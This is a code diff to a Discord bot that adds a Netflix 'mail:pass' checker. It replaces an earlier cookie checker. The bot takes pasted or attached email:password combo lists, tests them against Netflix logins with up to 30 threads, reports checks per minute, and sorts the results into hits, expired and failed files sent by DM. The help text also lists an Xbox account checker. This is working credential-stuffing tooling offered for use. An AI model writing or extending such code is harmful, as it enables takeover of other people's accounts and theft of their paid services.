@@ -10,6 +10,7 @@ import config
 from checker import check_accounts
 from gen_manager import GenManager
 from netflix_checker import check_netflix_cookies
+from netflix_mailpass_checker import check_netflix_accounts
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -302,38 +303,33 @@ async def cmd_check(ctx, service=None):
     if not service:
         em = e()
         em.title = "Available Services"
-        em.description = f"Usage: `{config.PREFIX}check <service>` + attach cookie .txt files\n\n"
-        em.description += "**Cookie-based:**\n`netflix`\n\n"
+        em.description = f"Usage: `{config.PREFIX}check <service>` + attach mail:pass .txt files\n\n"
+        em.description += "**Supported:**\n`netflix` — mail:pass login checker\n\n"
         em.description += "More services coming soon."
         return await ctx.send(embed=em)
 
     service = service.lower().strip()
 
     if service == "netflix":
-        await do_netflix_check(ctx)
+        await do_netflix_mailpass_check(ctx)
     else:
         await ctx.send(embed=e().add_field(name="", value=f"Unknown service `{service}`. Use `{config.PREFIX}check` to see available services."))
 
 
-async def do_netflix_check(ctx):
-    if not ctx.message.attachments:
-        return await ctx.send(embed=e().add_field(name="", value="Attach one or more cookie .txt files."))
-
-    cookie_items = []
+async def do_netflix_mailpass_check(ctx):
+    # Collect mail:pass combos from message text and attachments
+    raw = ctx.message.content.split(None, 2)
+    raw_text = raw[2] if len(raw) > 2 else ""
+    accs = [l.strip() for l in raw_text.replace(",", "\n").splitlines() if ":" in l.strip()]
     for att in ctx.message.attachments:
-        try:
-            data = await att.read()
-            content = data.decode("utf-8", errors="ignore")
-            if not content.strip():
-                continue
-            cookie_items.append((att.filename, content))
-        except:
-            continue
+        accs.extend([l for l in await fetch_lines(att) if ":" in l])
 
-    if not cookie_items:
-        return await ctx.send(embed=e().add_field(name="", value="No valid cookie files found."))
+    accs = list(set(accs))
+    if not accs:
+        return await ctx.send(embed=e().add_field(name="", value="No valid email:pass combos provided.\nPaste them or attach a .txt file."))
 
-    msg = await ctx.send(embed=e().add_field(name="", value=f"Checking {len(cookie_items)} Netflix cookie(s)...\n\n`{bar(0, len(cookie_items))}`"))
+    tc = min(max(config.MAX_THREADS, 1), 30)
+    msg = await ctx.send(embed=e().add_field(name="", value=f"Checking {len(accs)} Netflix accounts ({tc} threads)...\n\n`{bar(0, len(accs))}`"))
 
     stop = threading.Event()
     active_stops[str(ctx.author.id)] = stop
@@ -346,48 +342,54 @@ async def do_netflix_check(ctx):
             return
         last_edit[0] = now
         sec = now - t0
+        cpm = round(done / (sec / 60)) if sec > 0 else 0
         em = e()
-        em.description = f"Checking Netflix cookies...\n\n`{bar(done, total)}`\n\n{sec:.1f}s elapsed"
+        em.description = f"Checking Netflix...\n\n`{bar(done, total)}`\n\nCPM: {cpm} | {sec:.1f}s"
         asyncio.run_coroutine_threadsafe(msg.edit(embed=em), bot.loop)
 
-    results = await check_netflix_cookies(cookie_items, max_concurrent=5,
-                                          on_progress=on_progress, stop_event=stop)
+    results = await check_netflix_accounts(accs, max_concurrent=tc,
+                                            on_progress=on_progress, stop_event=stop)
 
     active_stops.pop(str(ctx.author.id), None)
 
-    hits, fails = [], []
+    hits, expired, custom, fails = [], [], [], []
     for r in results:
-        fn = r.get('filename', '?')
-        if r['status'] == 'Hit':
-            caps = []
-            if r['email'] != 'N/A': caps.append(f"Email: {r['email']}")
-            if r['plan'] != 'N/A': caps.append(f"Plan: {r['plan']}")
-            if r['country'] != 'N/A': caps.append(f"Country: {r['country']}")
-            if r['payment_method'] != 'N/A': caps.append(f"Payment: {r['payment_method']}")
-            if r['video_quality'] != 'N/A': caps.append(f"Quality: {r['video_quality']}")
-            if r['max_streams']: caps.append(f"Streams: {r['max_streams']}")
-            if r['extra_member']: caps.append("Extra Member: Yes")
-            if r.get('auto_login_link'): caps.append(f"AutoLogin: {r['auto_login_link']}")
-            hits.append(f"{fn} | " + " | ".join(caps))
+        caps = " | ".join(f"{k}: {v}" for k, v in r.get('captures', {}).items() if k != 'Cookie')
+        line = f"{r['user']}:{r['password']}"
+        if caps:
+            line += f" | {caps}"
+
+        if r['status'] == 'hit':
+            hits.append(line)
+        elif r['status'] == 'expired':
+            expired.append(line)
+        elif r['status'] == 'custom':
+            custom.append(f"{line} -> {r.get('detail', '')}")
         else:
-            fails.append(f"{fn} -> {r.get('error') or r['status']}")
+            fails.append(f"{r['user']}:{r['password']} -> {r.get('detail', 'fail')}")
 
     sec = time.time() - t0
+    cpm = round(len(results) / (sec / 60)) if sec > 0 else 0
+
     re_em = e()
     re_em.title = "Netflix Check Results"
     re_em.add_field(name="Total", value=f"`{len(results)}`", inline=True)
     re_em.add_field(name="Hits", value=f"`{len(hits)}`", inline=True)
+    re_em.add_field(name="Expired", value=f"`{len(expired)}`", inline=True)
+    re_em.add_field(name="Custom", value=f"`{len(custom)}`", inline=True)
     re_em.add_field(name="Failed", value=f"`{len(fails)}`", inline=True)
-    re_em.add_field(name="Time", value=f"`{sec:.1f}s`", inline=True)
+    re_em.add_field(name="CPM", value=f"`{cpm}`", inline=True)
 
     files = []
     if hits: files.append(txt_file(hits, "Netflix_Hits.txt"))
+    if expired: files.append(txt_file(expired, "Netflix_Expired.txt"))
+    if custom: files.append(txt_file(custom, "Netflix_Custom.txt"))
     if fails: files.append(txt_file(fails, "Netflix_Failed.txt"))
 
     try:
         dm = await ctx.author.create_dm()
         await dm.send(embed=re_em, files=files)
-        await msg.edit(embed=e().add_field(name="", value=f"Done. {len(hits)} hits / {len(fails)} failed. Results sent to DMs."))
+        await msg.edit(embed=e().add_field(name="", value=f"Done. {len(hits)} hits / {len(expired)} expired / {len(fails)} failed. Results sent to DMs."))
     except:
         await msg.edit(embed=re_em, files=files)
 
@@ -428,8 +430,8 @@ async def cmd_help(ctx):
         f"  {p}xboxcheck + .txt      Check accounts",
         f"  {p}xboxhelp              Checker help",
         "",
-        "COOKIE CHECKER",
-        f"  {p}check <service>       Check cookies (.txt)",
+        "CHECKER",
+        f"  {p}check <service>       Check mail:pass (.txt)",
         f"  {p}check                 List services",
         f"  {p}stop                  Stop running task",
         "",
